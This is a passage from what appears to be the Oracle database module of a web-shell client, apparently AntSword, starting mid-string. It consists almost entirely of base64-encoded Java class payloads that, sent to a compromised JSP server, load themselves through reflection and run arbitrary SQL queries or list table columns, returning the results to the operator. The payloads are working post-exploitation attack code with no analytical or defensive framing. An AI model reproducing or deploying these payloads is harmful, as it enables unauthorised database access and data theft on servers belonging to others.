nNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3Nob3dDb2x1bW5zAQBcKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhhc291dHB1dAEAEkJhc2U2NERlY29kZVRvQnl0ZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQARU2hvd19jb2x1bW5zLmphdmEMAG8AcAwAZgBnDABoAGkBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAwA6ADpAQAKZ2V0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwA6gDrAQAQamF2YS9sYW5nL09iamVjdAcA7AwA7QDuAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAC2dldFJlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDADvAPAMAPEA8gcA8wwA9AD1DAD2APcBABRhbnRzd29yZHJhbmRvbVByZWZpeAwAbQBrAQAGYmFzZTY0DABqAGsBAA9hbnRzd29yZENoYXJzZXQMAGwAawEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAAMAG8A+AEAAy0+fAEAA3w8LQEAEWFudHN3b3JkYXJnZW5jb2RlAQAPYW50c3dvcmRhcmdjb25uAQANYW50c3dvcmRhcmdkYgEAEGFudHN3b3JkYXJndGFibGUBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAPkA+AwA+gD4DAD7AHYMAHUAdgwAbgBrDAB6AHsMAPwA/QEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDAD8AP4MAP8BAAwBAQECDAB8AHYHAQMMAQQA+AcBBQwBBgEHDAEIAQkMAHMAdAEAEGphdmEvbGFuZy9TdHJpbmcMAH0AfgwAbwEKDAELAQABAAINCgEAAQoMAQwBDQwBDgEPBwEQDAERARIHARMMARQBFQcBFgwBFwEYBwEZDAEaARsHARwMAR0BHgwBHwEJDAEgASEMASIBCQEAAQkBAA5zZWxlY3QgKiBmcm9tIAEAAS4BAA8gV0hFUkUgUk9XTlVNPTAMAHgAeQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQACW0IMASMBJAwBJQEmDAEnASgMASkBKgcBKwwBLAEtAQAMamF2YS52ZXJzaW9uBwEuDAEvAHYBAAMxLjkMATABBwEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyDAExAOsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAEsATIBABxkYXRhYmFzZS9vcmFjbGUvU2hvd19jb2x1bW5zAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEdHJpbQEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAWamF2YS9zcWwvRHJpdmVyTWFuYWdlcgEADWdldENvbm5lY3Rpb24BAE0oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9Db25uZWN0aW9uOwEAE2phdmEvc3FsL0Nvbm5lY3Rpb24BAA9jcmVhdGVTdGF0ZW1lbnQBABYoKUxqYXZhL3NxbC9TdGF0ZW1lbnQ7AQASamF2YS9zcWwvU3RhdGVtZW50AQAMZXhlY3V0ZVF1ZXJ5AQAoKExqYXZhL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',
      [arg1]: '#{newbase64::encode}',
      [arg2]: '#{newbase64::conn}',
      [arg3]: '#{newbase64::db}',
      [arg4]: '#{newbase64::table}'
    },
    query: {
      _: 'yv66vgAAADEBQwoACQCHCQBqAIgJAGoAiQgAigoABwCLCACMBwCNCgAHAI4HAI8KAJAAkQcAkggAkwcAlAcAlQoACQCWCABrCgAHAJcKAJgAmQoAmACaCABtCACbCQBqAJwIAJ0JAGoAnggAnwkAagCgBwChCACiCgAbAKMIAKQIAKUIAKYIAKcIAKgIAKkIAKoLAA0AqwsACwCsCwANAKwLAAsArQoAagCuCQBqAK8KAGoAsAoAGwCxBwCyCgAtAIcIALMKAC0AtAoADgC1CgAtALULAA0AtgoAGwC1CgBqALcKALgAuQoAugC7CgA6ALwKADoAvQcAvgoAagC/CgA6AMAIAMEKAMIAwwgAxAoAOgDFCADGCADHCgAHAMgIAMkHAMoKADoAywgAzAoABwDNCgDOAM8IANAIANEKADoA0goAOgDTCADUCADVCgA6ANYKADoA1woA2ADZCwDaANsLANwA3QsA3gDfCwDgAOELAOAA4gsA3gDjCwDeAOQKAGoA5QgA5goAagDnBwDoCADpCQC6AOoKAJAAmQoABwDrCgC6AOwKAAcA7QoACQC1CADuCAB6CADvCADwCgAHAPEHAPIBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAMcmFuZG9tUHJlZml4AQAQZGVjb2RlckNsYXNzZGF0YQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAZkZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAAxCYXNlNjRFbmNvZGUBAApleGVjdXRlU1FMAQBvKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1opTGphdmEvbGFuZy9TdHJpbmc7AQAFcXVlcnkBAEooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBAApRdWVyeS5qYXZhDAB0AHUMAGsAbAwAbQBuAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAPMA9AEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAPUA9gEAEGphdmEvbGFuZy9PYmplY3QHAPcMAPgA+QEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAtnZXRSZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA+gD7DAD8AP0HAP4MAP8BAAwBAQECAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAHIAcAEABmJhc2U2NAwAbwBwAQAPYW50c3dvcmRDaGFyc2V0DABxAHABABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADAB0AQMBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADmFudHN3b3JkYXJnc3FsAQASYW50c3dvcmRhcmdkZWNvZGVyAQAJdGV4dC9odG1sDAEEAQMMAQUBAwwBBgB7DAB6AHsMAHMAcAwAgACBDAEHAQgBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBBwEJDAEKAQsMAQwBDQwAggB7BwEODAEPAQMHARAMAREBEgwBEwEUDAB4AHkBABBqYXZhL2xhbmcvU3RyaW5nDACDAIQMAHQBFQEADGphdmEudmVyc2lvbgcBFgwBFwB7AQADMS45DAEYARIBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RW5jb2RlcgwBGQD2AQAOZW5jb2RlVG9TdHJpbmcBAAJbQgwBGgEbAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBHAEdBwEeDAEfASABAAZlbmNvZGUBAAMNfAoMASEBIgwBIwELAQACDQoBAAEKDAEkASUMASYBJwcBKAwBKQEqBwErDAEsAS0HAS4MAS8BMAcBMQwBMgEzBwE0DAE1ATYMATcBFAwBOAE5DAE6ARQMAH0AewEAAwl8CQwAfgB/AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MMATsBPAwBPQE+DAE/AUAMAUEBHQEACmdldERlY29kZXIBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAEfAUIBABVkYXRhYmFzZS9vcmFjbGUvUXVlcnkBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BAAlnZXRNZXRob2QBAAhnZXRCeXRlcwEABCgpW0IBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACnJlcGxhY2VBbGwBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABHRyaW0BAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAFmphdmEvc3FsL0RyaXZlck1hbmFnZXIBAA1nZXRDb25uZWN0aW9uAQBNKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvQ29ubmVjdGlvbjsBABNqYXZhL3NxbC9Db25uZWN0aW9uAQAPY3JlYXRlU3RhdGVtZW50AQAWKClMamF2YS9zcWwvU3RhdGVtZW50OwEAEmphdmEvc3FsL1N0YXRlbWVudAEADGV4ZWN1dGVRdWVyeQEAKChMamF2YS9sYW5nL1N0cmluZzspTGphdmEv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',
      [arg1]: '#{newbase64::encode}',
      [arg2]: '#{newbase64::conn}',
      [arg3]: '#{newbase64::sql}'
    }
  })